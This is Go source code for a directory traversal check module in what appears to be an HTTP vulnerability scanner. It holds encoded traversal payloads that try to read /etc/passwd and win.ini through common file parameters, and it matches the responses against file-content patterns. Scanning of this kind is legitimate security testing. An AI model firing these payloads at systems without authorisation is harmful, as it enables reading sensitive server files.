package modules

import (
	"fmt"
	"io/ioutil"
	"net/url"
	"regexp"
	"strings"

	"github.com/aymaneallaoui/go-http-scanner/internal/model"
)

type DirectoryTraversalModule struct{}

func (m *DirectoryTraversalModule) Name() string {
	return "DirectoryTraversal"
}

func (m *DirectoryTraversalModule) Description() string {
	return "Checks for directory traversal vulnerabilities"
}

func (m *DirectoryTraversalModule) Run(s Scanner) ([]model.Vulnerability, error) {
	var vulnerabilities []model.Vulnerability
	logger := s.GetLogger()

	payloads := []string{
		"../../../etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..\\..\\..\\windows\\win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"..%255c..%255c..%255cwindows%255cwin.ini",
		"/etc/passwd",
		"file:///etc/passwd",
		"C:\\Windows\\win.ini",
	}

	unixPatterns := []string{
		"root:.*:0:0:",
		"bin:.*:1:1:",
		"daemon:.*:2:2:",
		"nobody:.*:99:99:",
	}

	windowsPatterns := []string{
		"\\[extensions\\]",
		"\\[fonts\\]",
		"\\[mci extensions\\]",
	}

	testPaths := []string{
		"/?file=PAYLOAD",
		"/include?file=PAYLOAD",
		"/display?page=PAYLOAD",
		"/download?file=PAYLOAD",
		"/view?path=PAYLOAD",
	}

	for _, path := range testPaths {
		for _, payload := range payloads {
			testPath := strings.Replace(path, "PAYLOAD", url.QueryEscape(payload), 1)
			logger.Debugf("Testing directory traversal with path: %s", testPath)

			resp, err := s.SendHTTPRequest("GET", testPath, nil, nil)
			if err != nil {
				logger.Debugf("Error requesting %s: %v", testPath, err)
				continue
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)

			if err != nil {
				logger.Debugf("Error reading response body: %v", err)
				continue
			}

			bodyStr := string(body)

			for _, pattern := range unixPatterns {
				re := regexp.MustCompile(pattern)
				if re.MatchString(bodyStr) {
					vulnerabilities = append(vulnerabilities, model.Vulnerability{
						ID:          "TRAVERSAL-01",
						Name:        "Directory Traversal",
						Description: "The application is vulnerable to directory traversal attacks",
						Severity:    model.SeverityCritical,
						CVSS:        9.3,
						Detail:      "The application allowed access to files outside the web root directory",
						Evidence:    fmt.Sprintf("Payload: %s, Response contains: %s", payload, re.FindString(bodyStr)),
						Remediation: "Validate and sanitize user input, use a whitelist approach for file inclusion",
						Reference:   "https://owasp.org/www-community/attacks/Path_Traversal",
					})
					return vulnerabilities, nil
				}
			}

			for _, pattern := range windowsPatterns {
				re := regexp.MustCompile(pattern)
				if re.MatchString(bodyStr) {
					vulnerabilities = append(vulnerabilities, model.Vulnerability{
						ID:          "TRAVERSAL-01",
						Name:        "Directory Traversal",
						Description: "The application is vulnerable to directory traversal attacks",
						Severity:    model.SeverityCritical,
						CVSS:        9.3,
						Detail:      "The application allowed access to files outside the web root directory",
						Evidence:    fmt.Sprintf("Payload: %s, Response contains: %s", payload, re.FindString(bodyStr)),
						Remediation: "Validate and sanitize user input, use a whitelist approach for file inclusion",
						Reference:   "https://owasp.org/www-community/attacks/Path_Traversal",
					})
					return vulnerabilities, nil
				}
			}
		}
	}

	return vulnerabilities, nil
}

func init() {
	RegisterModule(&DirectoryTraversalModule{})
}
